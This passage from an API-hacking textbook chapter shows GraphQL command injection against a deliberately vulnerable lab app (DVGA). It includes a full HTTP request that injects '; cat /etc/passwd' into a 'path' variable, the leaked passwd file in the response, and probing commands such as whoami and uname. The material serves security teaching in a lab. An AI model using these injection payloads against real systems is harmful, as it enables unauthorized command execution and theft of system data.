<figcaption><p><a id="figure14-15">Figure 14-15</a>: Intruder results for an attack on the <span class="LiteralInCaption"><code>"path"</code></span> variable</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_304" title="304"/>Digging through the responses, you can see that several of them were susceptible to the <code>whoami</code> command. This suggests that the <code>"path"</code> variable is vulnerable to operating system injection. In addition, the user that the command revealed is the privileged user, <code>root</code>, an indication that the app is running on a Linux host. You can update your second set of payloads to include the Linux commands <code>uname -a</code> and <code>ver</code> to see which operating system you are interacting with.</p>
<p>Once you’ve discovered the operating system, you can perform more targeted attacks to obtain sensitive information from the system. For example, in the request shown in <a href="#listing14-3" id="listinganchor14-3">Listing 14-3</a>, I’ve replaced the <code>"path"</code> variable with <code>/; cat /etc/passwd</code>, which will attempt to make the operating system return the <em>/etc/passwd</em> file containing a list of the accounts on the host system, shown in <a href="#listing14-4" id="listinganchor14-4">Listing 14-4</a>.</p>
<pre><code>POST /graphql HTTP/1.1
Host: 192.168.195.132:5000
Accept: application/json
Content-Type: application/json
<var>--snip--</var>

{"variables": {"scheme": "http",
"path": "/ <b>; </b><b>cat /etc/passwd",</b>
"port": 80, "host": "test.com"},
"query": "mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n          result\n        }\n      }"}</code></pre>
<p class="CodeListingCaption"><a id="listing14-3">Listing 14-3</a>: The request</p>
<pre><code>HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 1516
<var>--snip--</var>

{"data":{"importPaste":{"result":"&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;301 Moved Permanently&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n
&lt;h1&gt;Moved Permanently&lt;/h1&gt;\n&lt;p&gt;The document has moved &lt;a href=\"https://test.com/\"&gt;here&lt;/a&gt;.&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;\<b>n</b>
<b>root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nutmp:x:100:406:utmp:/home/utmp:/bin/false</b>\n"}}}</code></pre>
<p class="CodeListingCaption"><a id="listing14-4">Listing 14-4</a>: The response</p>
<p><span epub:type="pagebreak" id="Page_305" title="305"/>You now have the ability to execute all commands as the root user within the Linux operating system. Just like that, we’re able to inject system commands using a GraphQL API. From here, we could continue to enumerate information using this command injection vulnerability or else use commands to obtain a shell to the system. Either way, this is a very significant finding. Good job exploiting a GraphQL API!</p>
<h2 id="h1-502444c14-0006">Summary</h2>
<p class="BodyFirst">In this chapter, we walked through an attack of a GraphQL API using some of the techniques covered in this book. GraphQL operates differently than the REST APIs we’ve worked with up to this point. However, once we adapted a few things to GraphQL, we were able to apply many of the same techniques to perform some awesome exploits. Don’t be intimidated by new API types you might encounter; instead, embrace the tech, learn how it operates, and then experiment with the API attacks you’ve already learned.</p>
<p>DVGA has several more vulnerabilities we didn’t cover in this chapter. I recommend that you return to your lab and exploit them. In the final chapter, I’ll present real-world breaches and bounties involving APIs.</p>
</section>
</body>
</html>